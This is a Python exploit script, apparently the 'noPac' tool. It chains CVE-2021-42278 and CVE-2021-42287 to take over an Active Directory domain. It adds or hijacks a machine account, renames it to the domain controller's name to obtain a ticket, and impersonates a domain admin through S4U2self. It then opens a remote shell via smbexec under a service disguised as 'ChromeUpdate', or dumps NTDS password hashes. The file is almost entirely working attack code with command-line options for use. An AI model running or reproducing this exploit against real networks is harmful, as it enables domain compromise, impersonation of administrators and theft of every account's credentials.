#!/usr/bin/env python
# coding: utf-8
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import random
import string

from utils.S4U2self import GETST
from utils.addcomputer import AddComputerSAMR
from utils.helper import *
from utils.secretsdump import DumpSecrets
from utils.smbexec import CMDEXEC

characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")


def banner():
    return """
███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    """


def exploit(dcfull, adminticket, options):
    if options.shell or options.dump:
        logging.info("Pls make sure your choice hostname and the -dc-ip are same machine !!")
        logging.info('Exploiting..')
    # export KRB5CCNAME
    os.environ["KRB5CCNAME"] = adminticket
    if options.shell:
        try:
            executer = CMDEXEC('', '', domain, None, None, True, options.dc_ip,
                               options.mode, options.share, int(options.port), options.service_name, options.shell_type,
                               options.codec)
            executer.run(dcfull, options.dc_ip)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
    if options.dump:
        try:
            options.k = True
            options.target_ip = options.dc_ip
            options.system = options.bootkey = options.security = options.system = options.ntds = options.sam = options.resumefile = options.outputfile = None
            dumper = DumpSecrets(dcfull, '', '',
                                 domain, options)
            dumper.dump()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))


def samtheadmin(username, password, domain, options):
    if options.no_add and not options.target_name:
        logging.error(f'Net input a target with `-target-name` !')
        return
    if options.target_name:
        new_computer_name = options.target_name
    else:
        new_computer_name = 'WIN-' + ''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()

    if new_computer_name[-1] != '$':
        new_computer_name += '$'

    if options.no_add:
        if options.old_hash:
            if ":" not in options.old_hash:
                logging.error("Hash format error.")
                return
            options.old_pass = options.old_hash

        if options.old_pass:
            new_computer_password = options.old_pass
        else:
            # if change the computer password, trust relationship between target computer and the primary domain may failed !
            logging.error("Net input the password with `-old-pass` or `-old-hash` !")
            return
    else:
        options.old_pass = options.old_hash = ""
        if options.new_pass:
            new_computer_password = options.new_pass
        else:
            new_computer_password = ''.join(random.choice(characters) for _ in range(12))

    domain, username, password, lmhash, nthash = parse_identity(options)
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)

    cnf = ldapdomaindump.domainDumpConfig()
    cnf.basepath = None
    domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
    check_domain = ".".join(domain_dumper.getRoot().replace("DC=", "").split(","))
    if domain.upper() != check_domain.upper():
        logging.error("Pls use full domain name, such as: domain.com/username")
        return
    MachineAccountQuota = 10
    # check MAQ and options
    for i in domain_dumper.getDomainPolicy():
        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))

    if MachineAccountQuota < 1 and not options.no_add and not options.create_child:
        logging.error(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
        return
    else:
        logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')

    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if dn and options.no_add:
        logging.info(f'{new_computer_name} already exists! Using no-add mode.')
        if not options.old_pass:
            if options.use_ldap:
                logging.error(f'Modify password need ldaps !')
                return
            ldap_session.extend.microsoft.modify_password(str(dn['dn']), new_computer_password)
            if ldap_session.result['result'] == 0:
                logging.info(
                    f'Modify password successfully, host: {new_computer_name} password: {new_computer_password}')
            else:
                logging.error('Cannot change the machine password , exit.')
                return
    elif options.no_add and not dn:
        logging.error(f'Target {new_computer_name} not exists!')
        return
    elif dn:
        logging.error(f'Account {new_computer_name} already exists!')
        return

    if options.dc_host:
        dc_host = options.dc_host.upper()
        dcfull = f'{dc_host}.{domain}'
        dn = get_user_info(dc_host + "$", ldap_session, domain_dumper)
        if not dn:
            logging.error(f'Machine not found in LDAP: {dc_host}')
            return
    else:
        dcinfo = get_dc_host(ldap_session, domain_dumper, options)
        if len(dcinfo) == 0:
            logging.error("Cannot get domain info")
            exit()
        c_key = 0
        dcs = list(dcinfo.keys())
        if len(dcs) > 1:
            logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
            cnt = 0
            for name in dcs:
                logging.info(f"{cnt}: {name}")
                cnt += 1
            while True:
                try:
                    c_key = int(input(">>> Your choice: "))
                    if c_key in range(len(dcs)):
                        break
                except Exception:
                    pass
        dc_host = dcs[c_key].lower()
        dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()
    logging.info(f'Selected Target {dcfull}')
    if options.impersonate:
        domain_admin = options.impersonate
    else:
        domainAdmins = get_domain_admins(ldap_session, domain_dumper)
        logging.info(f'Total Domain Admins {len(domainAdmins)}')
        domain_admin = random.choice(domainAdmins)

    logging.info(f'will try to impersonate {domain_admin}')
    adminticket = str(f'{domain_admin}_{dcfull}.ccache')
    if os.path.exists(adminticket):
        logging.info(f'Already have user {domain_admin} ticket for target {dcfull}')
        exploit(dcfull, adminticket, options)
        return

    if not options.no_add:
        logging.info(f'Adding Computer Account "{new_computer_name}"')
        logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')

        # Creating Machine Account
        addmachineaccount = AddComputerSAMR(
            username,
            password,
            domain,
            options,
            computer_name=new_computer_name,
            computer_pass=new_computer_password)
        addmachineaccount.run()

    # CVE-2021-42278
    new_machine_dn = None
    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if dn:
        new_machine_dn = str(dn['dn'])
        logging.info(f'{new_computer_name} object = {new_machine_dn}')

    if new_machine_dn:
        ldap_session.modify(new_machine_dn, {'sAMAccountName': [ldap3.MODIFY_REPLACE, [dc_host]]})
        if ldap_session.result['result'] == 0:
            logging.info(f'{new_computer_name} sAMAccountName == {dc_host}')
        else:
            logging.error('Cannot rename the machine account , Reason {}'.format(ldap_session.result['message']))
            if not options.no_add:
                del_added_computer(ldap_session, domain_dumper, new_computer_name)
            return
    else:
        return

    # make hash none, we don't need id now.
    options.hashes = None

    # Getting a ticke
    try:
        getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
        getting_tgt.run()
    except Exception as e:
        logging.error(f"GetTGT error, error: {e}")
        # Restoring Old Values when get TGT error.
        logging.info(f"Reseting the machine account to {new_computer_name}")
        dn = get_user_info(dc_host, ldap_session, domain_dumper)
        ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
        if ldap_session.result['result'] == 0:
            logging.info(f'Restored {new_computer_name} sAMAccountName to original value')
        else:
            logging.error('Cannot restore the old name lol')
        return

    dcticket = str(dc_host + '.ccache')

    # Restoring Old Values
    logging.info(f"Reseting the machine account to {new_computer_name}")
    dn = get_user_info(dc_host, ldap_session, domain_dumper)
    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
    if ldap_session.result['result'] == 0:
        logging.info(f'Restored {new_computer_name} sAMAccountName to original value')
    else:
        logging.error('Cannot restore the old name lol')

    os.environ["KRB5CCNAME"] = dcticket

    try:
        executer = GETST(None, None, domain, options,
                         impersonate_target=domain_admin,
                         target_spn=f"{options.spn}/{dcfull}")
        executer.run()
    except Exception as e:
        logging.error(f"GetST error, error: {e}")
        return

    logging.info(f'Rename ccache to {adminticket}')
    os.rename(f'{domain_admin}.ccache', adminticket)

    # Delete domain computer we just added.
    if not options.no_add:
        del_added_computer(ldap_session, domain_dumper, new_computer_name)

    exploit(dcfull, adminticket, options)


if __name__ == '__main__':
    print(banner())

    parser = argparse.ArgumentParser(add_help=True, description="SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain")

    parser.add_argument('account', action='store', metavar='[domain/]username[:password]',
                        help='Account used to authenticate to DC.')
    parser.add_argument('--impersonate', action="store",
                        help='target username that will be impersonated (thru S4U2Self)'
                             ' for quering the ST. Keep in mind this will only work if '
                             'the identity provided in this scripts is allowed for '
                             'delegation to the SPN specified')

    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME',
                        help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-target-name', action='store', metavar='NEWNAME',
                        help='Target computer name, if not specified, will be random generated.')
    parser.add_argument('-new-pass', action='store', metavar='PASSWORD',
                        help='Add new computer password, if not specified, will be random generated.')
    parser.add_argument('-old-pass', action='store', metavar='PASSWORD',
                        help='Target computer password, use if you know the password of the target you input with -target-name.')
    parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH',
                        help='Target computer hashes, use if you know the hash of the target you input with -target-name.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
    parser.add_argument('-no-add', action='store_true', help='Forcibly change the password of the target computer.')
    parser.add_argument('-create-child', action='store_true', help='Current account have permission to CreateChild.')
    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
    parser.add_argument('-spn', help='Specify the SPN for the ticket (Default: cifs)',  default='cifs')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on account parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-host', action='store', metavar="hostname", help='Hostname of the domain controller to use. '
                                                                            'If ommited, the domain part (FQDN) '
                                                                            'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store', metavar="ip", help='IP of the domain controller to use. '
                                                                    'Useful if you can\'t translate the FQDN.'
                                                                    'specified in the account parameter will be used')
    parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')

    exec = parser.add_argument_group('execute options')
    exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                      help='Destination port to connect to SMB Server')
    exec.add_argument('-mode', action='store', choices={'SERVER', 'SHARE'}, default='SHARE',
                      help='mode to use (default SHARE, SERVER needs root!)')
    exec.add_argument('-share', action='store', default='ADMIN$',
                      help='share where the output will be grabbed from (default ADMIN$)')
    exec.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'], help='choose '
                                                                                                        'a command processor for the semi-interactive shell')
    exec.add_argument('-codec', action='store', default='GBK',
                      help='Sets encoding used (codec) from the target\'s output (default "GBK").')
    exec.add_argument('-service-name', action='store', metavar="service_name", default="ChromeUpdate",
                      help='The name of the'
                           'service used to trigger the payload')

    dumper = parser.add_argument_group('dump options')
    dumper.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                             'Implies also -just-dc switch')
    dumper.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    dumper.add_argument('-just-dc-ntlm', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes only)')
    dumper.add_argument('-pwd-last-set', action='store_true', default=False,
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    dumper.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    dumper.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    dumper.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                                                            'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                                                            'state')
    dumper.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    dumper.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec',
                        help='Remote exec '
                             'method to use at target (only when using -use-vss). Default: smbexec')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.account)

    if options.just_dc_user is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    try:
        if domain is None or domain == '':
            logging.error('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        samtheadmin(username, password, domain, options)
    except ldap3.core.exceptions.LDAPBindError as e:
        logging.error(f"Pls check your account. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
        logging.error(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(e)

